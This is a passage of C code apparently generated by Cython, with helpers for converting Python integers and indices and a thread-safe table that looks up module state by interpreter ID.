    __Pyx_TypeName result_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(result));
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ").  "
                "The ability to return an instance of a strict subclass of int is deprecated, "
                "and may be removed in a future version of Python.",
                result_type_name)) {
            __Pyx_DECREF_TypeName(result_type_name);
            Py_DECREF(result);
            return NULL;
        }
        __Pyx_DECREF_TypeName(result_type_name);
        return result;
    }
    PyErr_Format(PyExc_TypeError,
                 "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ")",
                 result_type_name);
    __Pyx_DECREF_TypeName(result_type_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_Long(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  PyObject *res = NULL;
  if (likely(PyLong_Check(x)))
      return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  if (likely(m && m->nb_int)) {
      res = m->nb_int(x);
  }
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
      res = PyNumber_Long(x);
  }
#endif
  if (likely(res)) {
      if (unlikely(!PyLong_CheckExact(res))) {
          return __Pyx_PyNumber_LongWrongResultType(res);
      }
  }
  else if (!PyErr_Occurred()) {
      PyErr_SetString(PyExc_TypeError,
                      "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(__Pyx_PyLong_IsCompact(b))) {
        return __Pyx_PyLong_CompactValue(b);
    } else {
      const digit* digits = __Pyx_PyLong_Digits(b);
      const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(b);
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyLong_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyLong_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject *__Pyx_Owned_Py_None(int b) {
    CYTHON_UNUSED_VAR(b);
    return __Pyx_NewRef(Py_None);
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyLong_FromSize_t(size_t ival) {
    return PyLong_FromSize_t(ival);
}


/* MultiPhaseInitModuleState */
#if CYTHON_PEP489_MULTI_PHASE_INIT && CYTHON_USE_MODULE_STATE
#ifndef CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
#if (CYTHON_COMPILING_IN_LIMITED_API || PY_VERSION_HEX >= 0x030C0000)
  #define CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE 1
#else
  #define CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE 0
#endif
#endif
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE && !CYTHON_ATOMICS
#error "Module state with PEP489 requires atomics. Currently that's one of\
 C11, C++11, gcc atomic intrinsics or MSVC atomic intrinsics"
#endif
#if !CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
#define __Pyx_ModuleStateLookup_Lock()
#define __Pyx_ModuleStateLookup_Unlock()
#elif !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x030d0000
static PyMutex __Pyx_ModuleStateLookup_mutex = {0};
#define __Pyx_ModuleStateLookup_Lock() PyMutex_Lock(&__Pyx_ModuleStateLookup_mutex)
#define __Pyx_ModuleStateLookup_Unlock() PyMutex_Unlock(&__Pyx_ModuleStateLookup_mutex)
#elif defined(__cplusplus) && __cplusplus >= 201103L
#include <mutex>
static std::mutex __Pyx_ModuleStateLookup_mutex;
#define __Pyx_ModuleStateLookup_Lock() __Pyx_ModuleStateLookup_mutex.lock()
#define __Pyx_ModuleStateLookup_Unlock() __Pyx_ModuleStateLookup_mutex.unlock()
#elif defined(__STDC_VERSION__) && (__STDC_VERSION__ > 201112L) && !defined(__STDC_NO_THREADS__)
#include <threads.h>
static mtx_t __Pyx_ModuleStateLookup_mutex;
static once_flag __Pyx_ModuleStateLookup_mutex_once_flag = ONCE_FLAG_INIT;
static void __Pyx_ModuleStateLookup_initialize_mutex(void) {
    mtx_init(&__Pyx_ModuleStateLookup_mutex, mtx_plain);
}
#define __Pyx_ModuleStateLookup_Lock()\
  call_once(&__Pyx_ModuleStateLookup_mutex_once_flag, __Pyx_ModuleStateLookup_initialize_mutex);\
  mtx_lock(&__Pyx_ModuleStateLookup_mutex)
#define __Pyx_ModuleStateLookup_Unlock() mtx_unlock(&__Pyx_ModuleStateLookup_mutex)
#elif defined(HAVE_PTHREAD_H)
#include <pthread.h>
static pthread_mutex_t __Pyx_ModuleStateLookup_mutex = PTHREAD_MUTEX_INITIALIZER;
#define __Pyx_ModuleStateLookup_Lock() pthread_mutex_lock(&__Pyx_ModuleStateLookup_mutex)
#define __Pyx_ModuleStateLookup_Unlock() pthread_mutex_unlock(&__Pyx_ModuleStateLookup_mutex)
#elif defined(_WIN32)
#include <Windows.h>  // synchapi.h on its own doesn't work
static SRWLOCK __Pyx_ModuleStateLookup_mutex = SRWLOCK_INIT;
#define __Pyx_ModuleStateLookup_Lock() AcquireSRWLockExclusive(&__Pyx_ModuleStateLookup_mutex)
#define __Pyx_ModuleStateLookup_Unlock() ReleaseSRWLockExclusive(&__Pyx_ModuleStateLookup_mutex)
#else
#error "No suitable lock available for CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE.\
 Requires C standard >= C11, or C++ standard >= C++11,\
 or pthreads, or the Windows 32 API, or Python >= 3.13."
#endif
typedef struct {
    int64_t id;
    PyObject *module;
} __Pyx_InterpreterIdAndModule;
typedef struct {
    char interpreter_id_as_index;
    Py_ssize_t count;
    Py_ssize_t allocated;
    __Pyx_InterpreterIdAndModule table[1];
} __Pyx_ModuleStateLookupData;
#define __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE 32
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
static __pyx_atomic_int_type __Pyx_ModuleStateLookup_read_counter = 0;
#endif
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
static __pyx_atomic_ptr_type __Pyx_ModuleStateLookup_data = 0;
#else
static __Pyx_ModuleStateLookupData* __Pyx_ModuleStateLookup_data = NULL;
#endif
static __Pyx_InterpreterIdAndModule* __Pyx_State_FindModuleStateLookupTableLowerBound(
        __Pyx_InterpreterIdAndModule* table,
        Py_ssize_t count,
        int64_t interpreterId) {
    __Pyx_InterpreterIdAndModule* begin = table;
    __Pyx_InterpreterIdAndModule* end = begin + count;
    if (begin->id == interpreterId) {
        return begin;
    }
    while ((end - begin) > __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE) {
        __Pyx_InterpreterIdAndModule* halfway = begin + (end - begin)/2;
        if (halfway->id == interpreterId) {
            return halfway;
        }
        if (halfway->id < interpreterId) {
            begin = halfway;
        } else {
            end = halfway;
        }
    }
    for (; begin < end; ++begin) {
        if (begin->id >= interpreterId) return begin;
    }
    return begin;
}
static PyObject *__Pyx_State_FindModule(CYTHON_UNUSED void* dummy) {
    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());
    if (interpreter_id == -1) return NULL;
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
    __Pyx_ModuleStateLookupData* data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_relaxed(&__Pyx_ModuleStateLookup_data);
    {
        __pyx_atomic_incr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);
        if (likely(data)) {
            __Pyx_ModuleStateLookupData* new_data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_acquire(&__Pyx_ModuleStateLookup_data);
            if (likely(data == new_data)) {
                goto read_finished;
            }
        }
        __pyx_atomic_decr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);
        __Pyx_ModuleStateLookup_Lock();
        __pyx_atomic_incr_relaxed(&__Pyx_ModuleStateLookup_read_counter);
        data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_relaxed(&__Pyx_ModuleStateLookup_data);
        __Pyx_ModuleStateLookup_Unlock();
    }
  read_finished:;
#else
    __Pyx_ModuleStateLookupData* data = __Pyx_ModuleStateLookup_data;
#endif
    __Pyx_InterpreterIdAndModule* found = NULL;
    if (unlikely(!data)) goto end;
    if (data->interpreter_id_as_index) {
        if (interpreter_id < data->count) {
            found = data->table+interpreter_id;
        }
    } else {
        found = __Pyx_State_FindModuleStateLookupTableLowerBound(
            data->table, data->count, interpreter_id);
    }
  end:
    {
        PyObject *result=NULL;
        if (found && found->id == interpreter_id) {
            result = found->module;
        }
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
        __pyx_atomic_decr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);
#endif
        return result;
    }
}
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
static void __Pyx_ModuleStateLookup_wait_until_no_readers(void) {
    while (__pyx_atomic_load(&__Pyx_ModuleStateLookup_read_counter) != 0);
}
#else
#define __Pyx_ModuleStateLookup_wait_until_no_readers()
#endif
static int __Pyx_State_AddModuleInterpIdAsIndex(__Pyx_ModuleStateLookupData **old_data, PyObject* module, int64_t interpreter_id) {
    Py_ssize_t to_allocate = (*old_data)->allocated;
    while (to_allocate <= interpreter_id) {
        if (to_allocate == 0) to_allocate = 1;
        else to_allocate *= 2;
    }
    __Pyx_ModuleStateLookupData *new_data = *old_data;
    if (to_allocate != (*old_data)->allocated) {
         new_data = (__Pyx_ModuleStateLookupData *)realloc(
            *old_data,
            sizeof(__Pyx_ModuleStateLookupData)+(to_allocate-1)*sizeof(__Pyx_InterpreterIdAndModule));
        if (!new_data) {
            PyErr_NoMemory();
            return -1;
        }
        for (Py_ssize_t i = new_data->allocated; i < to_allocate; ++i) {
            new_data->table[i].id = i;
            new_data->table[i].module = NULL;
        }
        new_data->allocated = to_allocate;
    }
    new_data->table[interpreter_id].module = module;
    if (new_data->count < interpreter_id+1) {
        new_data->count = interpreter_id+1;
    }
    *old_data = new_data;
    return 0;
}
static void __Pyx_State_ConvertFromInterpIdAsIndex(__Pyx_ModuleStateLookupData *data) {
    __Pyx_InterpreterIdAndModule *read = data->table;
    __Pyx_InterpreterIdAndModule *write = data->table;
    __Pyx_InterpreterIdAndModule *end = read + data->count;
    for (; read<end; ++read) {
        if (read->module) {
            write->id = read->id;
            write->module = read->module;
            ++write;
        }
    }
    data->count = write - data->table;
    for (; write<end; ++write) {
        write->id = 0;
        write->module = NULL;
    }
    data->interpreter_id_as_index = 0;
}
static int __Pyx_State_AddModule(PyObject* module, CYTHON_UNUSED void* dummy) {
    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());
    if (interpreter_id == -1) return -1;
    int result = 0;
    __Pyx_ModuleStateLookup_Lock();
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
    __Pyx_ModuleStateLookupData *old_data = (__Pyx_ModuleStateLookupData *)
            __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, 0);
#else
    __Pyx_ModuleStateLookupData *old_data = __Pyx_ModuleStateLookup_data;
#endif
    __Pyx_ModuleStateLookupData *new_data = old_data;
    if (!new_data) {
        new_data = (__Pyx_ModuleStateLookupData *)calloc(1, sizeof(__Pyx_ModuleStateLookupData));
        if (!new_data) {
            result = -1;
            PyErr_NoMemory();
            goto end;
        }
        new_data->allocated = 1;
        new_data->interpreter_id_as_index = 1;
    }
    __Pyx_ModuleStateLookup_wait_until_no_readers();
    if (new_data->interpreter_id_as_index) {
        if (interpreter_id < __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE) {
            result = __Pyx_State_AddModuleInterpIdAsIndex(&new_data, module, interpreter_id);
            goto end;
        }
        __Pyx_State_ConvertFromInterpIdAsIndex(new_data);
    }
    {
        Py_ssize_t insert_at = 0;
        {
            __Pyx_InterpreterIdAndModule* lower_bound = __Pyx_State_FindModuleStateLookupTableLowerBound(
                new_data->table, new_data->count, interpreter_id);
            assert(lower_bound);
            insert_at = lower_bound - new_data->table;
            if (unlikely(insert_at < new_data->count && lower_bound->id == interpreter_id)) {
                lower_bound->module = module;
                goto end;  // already in table, nothing more to do
            }
        }
        if (new_data->count+1 >= new_data->allocated) {
            Py_ssize_t to_allocate = (new_data->count+1)*2;
            new_data =
                (__Pyx_ModuleStateLookupData*)realloc(
                    new_data,
                    sizeof(__Pyx_ModuleStateLookupData) +
                    (to_allocate-1)*sizeof(__Pyx_InterpreterIdAndModule));
            if (!new_data) {
                result = -1;
                new_data = old_data;
                PyErr_NoMemory();
                goto end;
            }
            new_data->allocated = to_allocate;
        }
        ++new_data->count;
        int64_t last_id = interpreter_id;
        PyObject *last_module = module;
        for (Py_ssize_t i=insert_at; i<new_data->count; ++i) {
            int64_t current_id = new_data->table[i].id;
            new_data->table[i].id = last_id;
            last_id = current_id;
            PyObject *current_module = new_data->table[i].module;
            new_data->table[i].module = last_module;
            last_module = current_module;
        }
    }
  end:
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
    __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, new_data);
#else
    __Pyx_ModuleStateLookup_data = new_data;
#endif
    __Pyx_ModuleStateLookup_Unlock();
    return result;
}
static int __Pyx_State_RemoveModule(CYTHON_UNUSED void* dummy) {
    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());
    if (interpreter_id == -1) return -1;
    __Pyx_ModuleStateLookup_Lock();
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
    __Pyx_ModuleStateLookupData *data = (__Pyx_ModuleStateLookupData *)
            __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, 0);
#else
    __Pyx_ModuleStateLookupData *data = __Pyx_ModuleStateLookup_data;
#endif
    if (data->interpreter_id_as_index) {
        if (interpreter_id < data->count) {
            data->table[interpreter_id].module = NULL;
        }
        goto done;
    }
    {
        __Pyx_ModuleStateLookup_wait_until_no_readers();
        __Pyx_InterpreterIdAndModule* lower_bound = __Pyx_State_FindModuleStateLookupTableLowerBound(
            data->table, data->count, interpreter_id);
        if (!lower_bound) goto done;
        if (lower_bound->id != interpreter_id) goto done;
        __Pyx_InterpreterIdAndModule *end = data->table+data->count;
        for (;lower_bound<end-1; ++lower_bound) {
            lower_bound->id = (lower_bound+1)->id;
            lower_bound->module = (lower_bound+1)->module;
        }
    }
    --data->count;
    if (data->count == 0) {
        free(data);
        data = NULL;
    }
  done:
#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE
    __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, data);
#else
    __Pyx_ModuleStateLookup_data = data;
#endif
    __Pyx_ModuleStateLookup_Unlock();
    return 0;
}
#endif

/* #### Code section: utility_code_pragmas_end ### */
#ifdef _MSC_VER
#pragma warning( pop )
#endif



/* #### Code section: end ### */
#endif /* Py_PYTHON_H */
